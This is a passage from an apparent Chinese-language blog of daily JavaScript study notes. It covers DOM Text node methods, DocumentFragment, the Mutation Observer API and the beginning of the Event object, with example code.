<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> el = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;para&#x27;</span>);</span><br><span class="line">el.firstChild.wholeText <span class="comment">// &quot;A &quot;</span></span><br><span class="line">el.firstChild.data <span class="comment">// &quot;A &quot;</span></span><br></pre></td></tr></table></figure>
<p>但是，一旦移除<code>&lt;em&gt;</code>节点，<code>wholeText</code>属性与<code>data</code>属性就会有差异，因为这时其实<code>&lt;p&gt;</code>节点下面包含了两个毗邻的文本节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">el.removeChild(para.childNodes[<span class="number">1</span>]);</span><br><span class="line">el.firstChild.wholeText <span class="comment">// &quot;A C&quot;</span></span><br><span class="line">el.firstChild.data <span class="comment">// &quot;A &quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="8-2-3-length"><a href="#8-2-3-length" class="headerlink" title="8.2.3 length"></a>8.2.3 length</h5><p><code>length</code>属性返回当前文本节点的文本长度。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">new</span> Text(<span class="string">&#x27;Hello&#x27;</span>)).length <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>

<h5 id="8-2-4-nextElementSibling，previousElementSibling"><a href="#8-2-4-nextElementSibling，previousElementSibling" class="headerlink" title="8.2.4 nextElementSibling，previousElementSibling"></a>8.2.4 nextElementSibling，previousElementSibling</h5><p><code>nextElementSibling</code>属性返回紧跟在当前文本节点后面的那个同级元素节点。如果取不到元素节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 为</span></span><br><span class="line"><span class="comment">// &lt;div&gt;Hello &lt;em&gt;World&lt;/em&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> tn = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;div&#x27;</span>).firstChild;</span><br><span class="line">tn.nextElementSibling</span><br><span class="line"><span class="comment">// &lt;em&gt;World&lt;/em&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>previousElementSibling</code>属性返回当前文本节点前面最近的同级元素节点。如果取不到元素节点，则返回<code>null：</code>。</p>
<h4 id="8-3-Text-节点的方法"><a href="#8-3-Text-节点的方法" class="headerlink" title="8.3 Text 节点的方法"></a>8.3 Text 节点的方法</h4><h5 id="8-3-1-appendData-，deleteData-，insertData-，replaceData-，subStringData"><a href="#8-3-1-appendData-，deleteData-，insertData-，replaceData-，subStringData" class="headerlink" title="8.3.1 appendData()，deleteData()，insertData()，replaceData()，subStringData()"></a>8.3.1 appendData()，deleteData()，insertData()，replaceData()，subStringData()</h5><p>以下5个方法都是编辑<code>Text</code>节点文本内容的方法。</p>
<ul>
<li><code>appendData()</code>：在<code>Text</code>节点尾部追加字符串。</li>
<li><code>deleteData()</code>：删除<code>Text</code>节点内部的子字符串，第一个参数为子字符串开始位置，第二个参数为子字符串长度。</li>
<li><code>insertData()</code>：在<code>Text</code>节点插入字符串，第一个参数为插入位置，第二个参数为插入的子字符串。</li>
<li><code>replaceData()</code>：用于替换文本，第一个参数为替换开始位置，第二个参数为需要被替换掉的长度，第三个参数为新加入的字符串。</li>
<li><code>subStringData()</code>：用于获取子字符串，第一个参数为子字符串在<code>Text</code>节点中的开始位置，第二个参数为子字符串长度。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;p&gt;Hello World&lt;/p&gt;</span></span><br><span class="line"><span class="keyword">var</span> pElementText = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;p&#x27;</span>).firstChild;</span><br><span class="line"></span><br><span class="line">pElementText.appendData(<span class="string">&#x27;!&#x27;</span>);</span><br><span class="line"><span class="comment">// 页面显示 Hello World!</span></span><br><span class="line">pElementText.deleteData(<span class="number">7</span>, <span class="number">5</span>);</span><br><span class="line"><span class="comment">// 页面显示 Hello W</span></span><br><span class="line">pElementText.insertData(<span class="number">7</span>, <span class="string">&#x27;Hello &#x27;</span>);</span><br><span class="line"><span class="comment">// 页面显示 Hello WHello</span></span><br><span class="line">pElementText.replaceData(<span class="number">7</span>, <span class="number">5</span>, <span class="string">&#x27;World&#x27;</span>);</span><br><span class="line"><span class="comment">// 页面显示 Hello WWorld</span></span><br><span class="line">pElementText.substringData(<span class="number">7</span>, <span class="number">10</span>);</span><br><span class="line"><span class="comment">// 页面显示不变，返回&quot;World &quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="8-3-2-remove"><a href="#8-3-2-remove" class="headerlink" title="8.3.2 remove()"></a>8.3.2 remove()</h5><p><code>remove</code>方法用于移除当前<code>Text</code>节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;p&gt;Hello World&lt;/p&gt;</span></span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&#x27;p&#x27;</span>).firstChild.remove()</span><br><span class="line"><span class="comment">// 现在 HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;p&gt;&lt;/p&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="8-3-3-splitText"><a href="#8-3-3-splitText" class="headerlink" title="8.3.3 splitText()"></a>8.3.3 splitText()</h5><p><code>splitText</code>方法将<code>Text</code>节点一分为二，变成两个毗邻的<code>Text</code>节点。它的参数就是分割位置（从零开始），分割到该位置的字符前结束。如果分割位置不存在，将报错。</p>
<p>分割后，该方法返回分割位置后方的字符串，而原<code>Text</code>节点变成只包含分割位置前方的字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// html 代码为 &lt;p id=&quot;p&quot;&gt;foobar&lt;/p&gt;</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> textnode = p.firstChild;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> newText = textnode.splitText(<span class="number">3</span>);</span><br><span class="line">newText <span class="comment">// &quot;bar&quot;</span></span><br><span class="line">textnode <span class="comment">// &quot;foo&quot;</span></span><br></pre></td></tr></table></figure>
<p>父元素节点的<code>normalize</code>方法可以将毗邻的两个<code>Text</code>节点合并。</p>
<p>接上面的例子，文本节点的<code>splitText</code>方法将一个<code>Text</code>节点分割成两个，父元素的<code>normalize</code>方法可以实现逆操作，将它们合并。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">p.childNodes.length <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将毗邻的两个 Text 节点合并</span></span><br><span class="line">p.normalize();</span><br><span class="line">p.childNodes.length <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<h4 id="8-4-DocumentFragment-节点"><a href="#8-4-DocumentFragment-节点" class="headerlink" title="8.4 DocumentFragment 节点"></a>8.4 DocumentFragment 节点</h4><p><code>DocumentFragment</code>节点代表一个文档的片段，本身就是一个完整的 DOM 树形结构。它没有父节点，<code>parentNode</code>返回<code>null</code>，但是可以插入任意数量的子节点。它不属于当前文档，操作<code>DocumentFragment</code>节点，要比直接操作 DOM 树快得多。</p>
<p>它一般用于构建一个 DOM 结构，然后插入当前文档。<code>document.createDocumentFragment</code>方法，以及浏览器原生的<code>DocumentFragment</code>构造函数，可以创建一个空的<code>DocumentFragment</code>节点。然后再使用其他 DOM 方法，向其添加子节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> docFrag = <span class="built_in">document</span>.createDocumentFragment();</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> docFrag = <span class="keyword">new</span> DocumentFragment();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> li = <span class="built_in">document</span>.createElement(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line">li.textContent = <span class="string">&#x27;Hello World&#x27;</span>;</span><br><span class="line">docFrag.appendChild(li);</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&#x27;ul&#x27;</span>).appendChild(docFrag);</span><br></pre></td></tr></table></figure>
<p>上面代码创建了一个<code>DocumentFragment</code>节点，然后将一个<code>li</code>节点添加在它里面，最后将<code>DocumentFragment</code>节点移动到原文档。</p>
<p>注意，<code>DocumentFragment</code>节点本身不能被插入当前文档。当它作为<code>appendChild()</code>、<code>insertBefore()</code>、<code>replaceChild()</code>等方法的参数时，是它的所有子节点插入当前文档，而不是它自身。一旦<code>DocumentFragment</code>节点被添加进当前文档，它自身就变成了空节点（<code>textContent</code>属性为空字符串），可以被再次使用。如果想要保存<code>DocumentFragment</code>节点的内容，可以使用<code>cloneNode</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span></span><br><span class="line">  .querySelector(<span class="string">&#x27;ul&#x27;</span>)</span><br><span class="line">  .appendChild(docFrag.cloneNode(<span class="literal">true</span>));</span><br></pre></td></tr></table></figure>
<p>上面这样添加<code>DocumentFragment</code>节点进入当前文档，不会清空<code>DocumentFragment</code>节点。</p>
<p>下面是一个例子，使用<code>DocumentFragment</code>反转一个指定节点的所有子节点的顺序。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reverse</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> f = <span class="built_in">document</span>.createDocumentFragment();</span><br><span class="line">  <span class="keyword">while</span>(n.lastChild) f.appendChild(n.lastChild);</span><br><span class="line">  n.appendChild(f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>DocumentFragment</code>节点对象没有自己的属性和方法，全部继承自<code>Node</code>节点和<code>ParentNode</code>接口。也就是说，<code>DocumentFragment</code>节点比<code>Node</code>节点多出以下四个属性。</p>
<ul>
<li><code>children</code>：返回一个动态的<code>HTMLCollection</code>集合对象，包括当前<code>DocumentFragment</code>对象的所有子元素节点。</li>
<li><code>firstElementChild</code>：返回当前<code>DocumentFragment</code>对象的第一个子元素节点，如果没有则返回<code>null</code>。</li>
<li><code>lastElementChild</code>：返回当前<code>DocumentFragment</code>对象的最后一个子元素节点，如果没有则返回<code>null</code>。</li>
<li><code>childElementCount</code>：返回当前<code>DocumentFragment</code>对象的所有子元素数量。</li>
</ul>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS DOM-Text 节点和 DocumentFragment 节点</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0043</title>
    <url>/2021/05/26/%E6%89%93%E5%8D%A10043/</url>
    <content><![CDATA[<p><font color=#fedcbd>别让纠结怨怼，耽误了你对美好风景的体验。</font></p>
<h2 id="JS-DOM"><a href="#JS-DOM" class="headerlink" title="JS DOM"></a>JS DOM</h2><h3 id="10-Mutation-Observer-API"><a href="#10-Mutation-Observer-API" class="headerlink" title="10. Mutation Observer API"></a>10. Mutation Observer API</h3><h4 id="10-1-概述"><a href="#10-1-概述" class="headerlink" title="10.1 概述"></a>10.1 概述</h4><p>Mutation Observer API 用来监视 DOM 变动。DOM 的任何变动，比如节点的增减、属性的变动、文本内容的变动，这个 API 都可以得到通知。</p>
<p>概念上，它很接近事件，可以理解为 DOM 发生变动就会触发 Mutation Observer 事件。但是，它与事件有一个本质不同：事件是同步触发，也就是说，DOM 的变动立刻会触发相应的事件；Mutation Observer 则是异步触发，DOM 的变动并不会马上触发，而是要等到当前所有 DOM 操作都结束才触发。</p>
<p>这样设计是为了应付 DOM 变动频繁的特点。举例来说，如果文档中连续插入1000个<code>&lt;p&gt;</code>元素，就会连续触发1000个插入事件，执行每个事件的回调函数，这很可能造成浏览器的卡顿；而 Mutation Observer 完全不同，只在1000个段落都插入结束后才会触发，而且只触发一次。</p>
<p>Mutation Observer 有以下特点。</p>
<ul>
<li>它等待所有脚本任务完成后，才会运行（即异步触发方式）。</li>
<li>它把 DOM 变动记录封装成一个数组进行处理，而不是一条条个别处理 DOM 变动。</li>
<li>它既可以观察 DOM 的所有类型变动，也可以指定只观察某一类变动。</li>
</ul>
<span id="more"></span>
<h4 id="10-2-MutationObserver-构造函数"><a href="#10-2-MutationObserver-构造函数" class="headerlink" title="10.2 MutationObserver 构造函数"></a>10.2 MutationObserver 构造函数</h4><p>使用时，首先使用<code>MutationObserver</code>构造函数，新建一个观察器实例，同时指定这个实例的回调函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> observer = <span class="keyword">new</span> MutationObserver(callback);</span><br></pre></td></tr></table></figure>
<p>上面代码中的回调函数，会在每次 DOM 变动后调用。该回调函数接受两个参数，第一个是变动数组，第二个是观察器实例，下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> observer = <span class="keyword">new</span> MutationObserver(<span class="function"><span class="keyword">function</span> (<span class="params">mutations, observer</span>) </span>&#123;</span><br><span class="line">  mutations.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">mutation</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(mutation);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h4 id="10-3-MutationObserver-的实例方法"><a href="#10-3-MutationObserver-的实例方法" class="headerlink" title="10.3 MutationObserver 的实例方法"></a>10.3 MutationObserver 的实例方法</h4><h5 id="10-3-1-observe"><a href="#10-3-1-observe" class="headerlink" title="10.3.1 observe()"></a>10.3.1 observe()</h5><p><code>observe()</code>方法用来启动监听，它接受两个参数。</p>
<ul>
<li>第一个参数：所要观察的 DOM 节点</li>
<li>第二个参数：一个配置对象，指定所要观察的特定变动<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> article = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;article&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span>  options = &#123;</span><br><span class="line">  <span class="string">&#x27;childList&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&#x27;attributes&#x27;</span>:<span class="literal">true</span></span><br><span class="line">&#125; ;</span><br><span class="line"></span><br><span class="line">observer.observe(article, options);</span><br></pre></td></tr></table></figure>
上面代码中，<code>observe()</code>方法接受两个参数，第一个是所要观察的DOM元素是<code>article</code>，第二个是所要观察的变动类型（子节点变动和属性变动）。</li>
</ul>
<p>观察器所能观察的 DOM 变动类型（即上面代码的<code>options</code>对象），有以下几种。</p>
<ul>
<li><strong>childList</strong>：子节点的变动（指新增，删除或者更改）。</li>
<li><strong>attributes</strong>：属性的变动。</li>
<li><strong>characterData</strong>：节点内容或节点文本的变动。</li>
</ul>
<p>想要观察哪一种变动类型，就在<code>option</code>对象中指定它的值为<code>true</code>。需要注意的是，至少必须同时指定这三种观察的一种，若均未指定将报错。</p>
<p>除了变动类型，<code>options</code>对象还可以设定以下属性：</p>
<ul>
<li><code>subtree</code>：布尔值，表示是否将该观察器应用于该节点的所有后代节点。</li>
<li><code>attributeOldValue</code>：布尔值，表示观察<code>attributes</code>变动时，是否需要记录变动前的属性值。</li>
<li><code>characterDataOldValue</code>：布尔值，表示观察<code>characterData</code>变动时，是否需要记录变动前的值。</li>
<li><code>attributeFilter</code>：数组，表示需要观察的特定属性（比如<code>[&#39;class&#39;,&#39;src&#39;]</code>）。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 开始监听文档根节点（即&lt;html&gt;标签）的变动</span></span><br><span class="line">mutationObserver.observe(<span class="built_in">document</span>.documentElement, &#123;</span><br><span class="line">  attributes: <span class="literal">true</span>,</span><br><span class="line">  characterData: <span class="literal">true</span>,</span><br><span class="line">  childList: <span class="literal">true</span>,</span><br><span class="line">  subtree: <span class="literal">true</span>,</span><br><span class="line">  attributeOldValue: <span class="literal">true</span>,</span><br><span class="line">  characterDataOldValue: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>对一个节点添加观察器，就像使用<code>addEventListener()</code>方法一样，多次添加同一个观察器是无效的，回调函数依然只会触发一次。如果指定不同的<code>options</code>对象，以后面添加的那个为准，类似覆盖。</p>
<p>下面的例子是观察新增的子节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> insertedNodes = [];</span><br><span class="line"><span class="keyword">var</span> observer = <span class="keyword">new</span> MutationObserver(<span class="function"><span class="keyword">function</span>(<span class="params">mutations</span>) </span>&#123;</span><br><span class="line">  mutations.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">mutation</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; mutation.addedNodes.length; i++) &#123;</span><br><span class="line">      insertedNodes.push(mutation.addedNodes[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="built_in">console</span>.log(insertedNodes);</span><br><span class="line">&#125;);</span><br><span class="line">observer.observe(<span class="built_in">document</span>, &#123; <span class="attr">childList</span>: <span class="literal">true</span>, <span class="attr">subtree</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure>
<h5 id="10-3-2-disconnect-，takeRecords（）"><a href="#10-3-2-disconnect-，takeRecords（）" class="headerlink" title="10.3.2 disconnect()，takeRecords（）"></a>10.3.2 disconnect()，takeRecords（）</h5><p><code>disconnect()</code>方法用来停止观察。调用该方法后，DOM 再发生变动，也不会触发观察器。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">observer.disconnect();</span><br></pre></td></tr></table></figure>
<p><code>takeRecords()</code>方法用来清除变动记录，即不再处理未处理的变动。该方法返回变动记录的数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">observer.takeRecords();</span><br></pre></td></tr></table></figure>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 保存所有没有被观察器处理的变动</span></span><br><span class="line"><span class="keyword">var</span> changes = mutationObserver.takeRecords();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 停止观察</span></span><br><span class="line">mutationObserver.disconnect();</span><br></pre></td></tr></table></figure>
<h4 id="10-4-MutationRecord-对象"><a href="#10-4-MutationRecord-对象" class="headerlink" title="10.4 MutationRecord 对象"></a>10.4 MutationRecord 对象</h4><p>DOM 每次发生变化，就会生成一条变动记录（MutationRecord 实例）。该实例包含了与变动相关的所有信息。Mutation Observer 处理的就是一个个<code>MutationRecord</code>实例所组成的数组。</p>
<p><code>MutationRecord</code>对象包含了DOM的相关信息，有如下属性：</p>
<ul>
<li><code>type</code>：观察的变动类型（<code>attributes</code>、<code>characterData</code>或者<code>childList</code>）。</li>
<li><code>target</code>：发生变动的DOM节点。</li>
<li><code>addedNodes</code>：新增的DOM节点。</li>
<li><code>removedNodes</code>：删除的DOM节点。</li>
<li><code>previousSibling</code>：前一个同级节点，如果没有则返回<code>null</code>。</li>
<li><code>nextSibling</code>：下一个同级节点，如果没有则返回<code>null</code>。</li>
<li><code>attributeName</code>：发生变动的属性。如果设置了<code>attributeFilter</code>，则只返回预先指定的属性。</li>
<li><code>oldValue</code>：变动前的值。这个属性只对<code>attribute</code>和<code>characterData</code>变动有效，如果发生<code>childList</code>变动，则返回<code>null</code>。</li>
</ul>
<h4 id="10-5-应用示例"><a href="#10-5-应用示例" class="headerlink" title="10.5 应用示例"></a>10.5 应用示例</h4><h5 id="10-5-1-子元素的变动"><a href="#10-5-1-子元素的变动" class="headerlink" title="10.5.1 子元素的变动"></a>10.5.1 子元素的变动</h5><p>下面的例子说明如何读取变动记录。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> callback = <span class="function"><span class="keyword">function</span> (<span class="params">records</span>)</span>&#123;</span><br><span class="line">  records.map(<span class="function"><span class="keyword">function</span>(<span class="params">record</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Mutation type: &#x27;</span> + record.type);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Mutation target: &#x27;</span> + record.target);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mo = <span class="keyword">new</span> MutationObserver(callback);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> option = &#123;</span><br><span class="line">  <span class="string">&#x27;childList&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&#x27;subtree&#x27;</span>: <span class="literal">true</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">mo.observe(<span class="built_in">document</span>.body, option);</span><br></pre></td></tr></table></figure>
<p>上面代码的观察器，观察<code>&lt;body&gt;</code>的所有下级节点（<code>childList</code>表示观察子节点，<code>subtree</code>表示观察后代节点）的变动。回调函数会在控制台显示所有变动的类型和目标节点。</p>
<h5 id="10-5-2-属性的变动"><a href="#10-5-2-属性的变动" class="headerlink" title="10.5.2 属性的变动"></a>10.5.2 属性的变动</h5><p>下面的例子说明如何追踪属性的变动。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> callback = <span class="function"><span class="keyword">function</span> (<span class="params">records</span>) </span>&#123;</span><br><span class="line">  records.map(<span class="function"><span class="keyword">function</span> (<span class="params">record</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Previous attribute value: &#x27;</span> + record.oldValue);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mo = <span class="keyword">new</span> MutationObserver(callback);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> element = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;#my_element&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">  <span class="string">&#x27;attributes&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&#x27;attributeOldValue&#x27;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mo.observe(element, options);</span><br></pre></td></tr></table></figure>
<p>上面代码先设定追踪属性变动（<code>&#39;attributes&#39;: true</code>），然后设定记录变动前的值。实际发生变动时，会将变动前的值显示在控制台。</p>
<h5 id="10-5-3-取代-DOMContentLoaded-事件"><a href="#10-5-3-取代-DOMContentLoaded-事件" class="headerlink" title="10.5.3 取代 DOMContentLoaded 事件"></a>10.5.3 取代 DOMContentLoaded 事件</h5><p>网页加载的时候，DOM 节点的生成会产生变动记录，因此只要观察 DOM 的变动，就能在第一时间触发相关事件，也就没有必要使用<code>DOMContentLoaded</code>事件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> observer = <span class="keyword">new</span> MutationObserver(callback);</span><br><span class="line">observer.observe(<span class="built_in">document</span>.documentElement, &#123;</span><br><span class="line">  childList: <span class="literal">true</span>,</span><br><span class="line">  subtree: <span class="literal">true</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码中，监听<code>document.documentElement</code>（即网页的<code>&lt;html&gt;</code>HTML 节点）的子节点的变动，<code>subtree</code>属性指定监听还包括后代节点。因此，任意一个网页元素一旦生成，就能立刻被监听到。</p>
<p>下面的代码，使用<code>MutationObserver</code>对象封装一个监听 DOM 生成的函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">win</span>)</span>&#123;</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> listeners = [];</span><br><span class="line">  <span class="keyword">var</span> doc = win.document;</span><br><span class="line">  <span class="keyword">var</span> MutationObserver = win.MutationObserver || win.WebKitMutationObserver;</span><br><span class="line">  <span class="keyword">var</span> observer;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">ready</span>(<span class="params">selector, fn</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 储存选择器和回调函数</span></span><br><span class="line">    listeners.push(&#123;</span><br><span class="line">      selector: selector,</span><br><span class="line">      fn: fn</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span>(!observer)&#123;</span><br><span class="line">      <span class="comment">// 监听document变化</span></span><br><span class="line">      observer = <span class="keyword">new</span> MutationObserver(check);</span><br><span class="line">      observer.observe(doc.documentElement, &#123;</span><br><span class="line">        childList: <span class="literal">true</span>,</span><br><span class="line">        subtree: <span class="literal">true</span></span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查该节点是否已经在DOM中</span></span><br><span class="line">    check();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 检查是否匹配已储存的节点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; listeners.length; i++)&#123;</span><br><span class="line">      <span class="keyword">var</span> listener = listeners[i];</span><br><span class="line">      <span class="comment">// 检查指定节点是否有匹配</span></span><br><span class="line">      <span class="keyword">var</span> elements = doc.querySelectorAll(listener.selector);</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; elements.length; j++)&#123;</span><br><span class="line">        <span class="keyword">var</span> element = elements[j];</span><br><span class="line">        <span class="comment">// 确保回调函数只会对该元素调用一次</span></span><br><span class="line">        <span class="keyword">if</span>(!element.ready)&#123;</span><br><span class="line">          element.ready = <span class="literal">true</span>;</span><br><span class="line">          <span class="comment">// 对该节点调用回调函数</span></span><br><span class="line">          listener.fn.call(element, element);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 对外暴露ready</span></span><br><span class="line">  win.ready = ready;</span><br><span class="line"></span><br><span class="line">&#125;)(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用方法</span></span><br><span class="line">ready(<span class="string">&#x27;.foo&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">element</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS DOM-Mutation Observer API</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0046</title>
    <url>/2021/05/28/%E6%89%93%E5%8D%A10046/</url>
    <content><![CDATA[<p><font color=#90d7ec>一个人做再大的承诺，都不及踏踏实实、认认真真做事更让人放心。</font></p>
<h2 id="JS-事件"><a href="#JS-事件" class="headerlink" title="JS 事件"></a>JS 事件</h2><h3 id="3-Event-对象"><a href="#3-Event-对象" class="headerlink" title="3. Event 对象"></a>3. Event 对象</h3><h4 id="3-1-概述"><a href="#3-1-概述" class="headerlink" title="3.1 概述"></a>3.1 概述</h4><p>事件发生以后，会产生一个事件对象，作为参数传给监听函数。浏览器原生提供一个<code>Event</code>对象，所有的事件都是这个对象的实例，或者说继承了<code>Event.prototype</code>对象。</p>
<p><code>Event</code>对象本身就是一个构造函数，可以用来生成新的实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">event = <span class="keyword">new</span> Event(type, options);</span><br></pre></td></tr></table></figure>
<p><code>Event</code>构造函数接受两个参数。第一个参数<code>type</code>是字符串，表示事件的名称；第二个参数<code>options</code>是一个对象，表示事件对象的配置。该对象主要有下面两个属性。</p>
<ul>
<li><code>bubbles</code>：布尔值，可选，默认为<code>false</code>，表示事件对象是否冒泡。</li>
<li><code>cancelable</code>：布尔值，可选，默认为<code>false</code>，表示事件是否可以被取消，即能否用<code>Event.preventDefault()</code>取消这个事件。一旦事件被取消，就好像从来没有发生过，不会触发浏览器对该事件的默认行为。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ev = <span class="keyword">new</span> Event(</span><br><span class="line">  <span class="string">&#x27;look&#x27;</span>,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&#x27;bubbles&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&#x27;cancelable&#x27;</span>: <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">);</span><br><span class="line"><span class="built_in">document</span>.dispatchEvent(ev);</span><br></pre></td></tr></table></figure>
<p>上面代码新建一个<code>look</code>事件实例，然后使用<code>dispatchEvent</code>方法触发该事件。</p>
<span id="more"></span>
<p>注意，如果不是显式指定<code>bubbles</code>属性为<code>true</code>，生成的事件就只能在“捕获阶段”触发监听函数。</p>
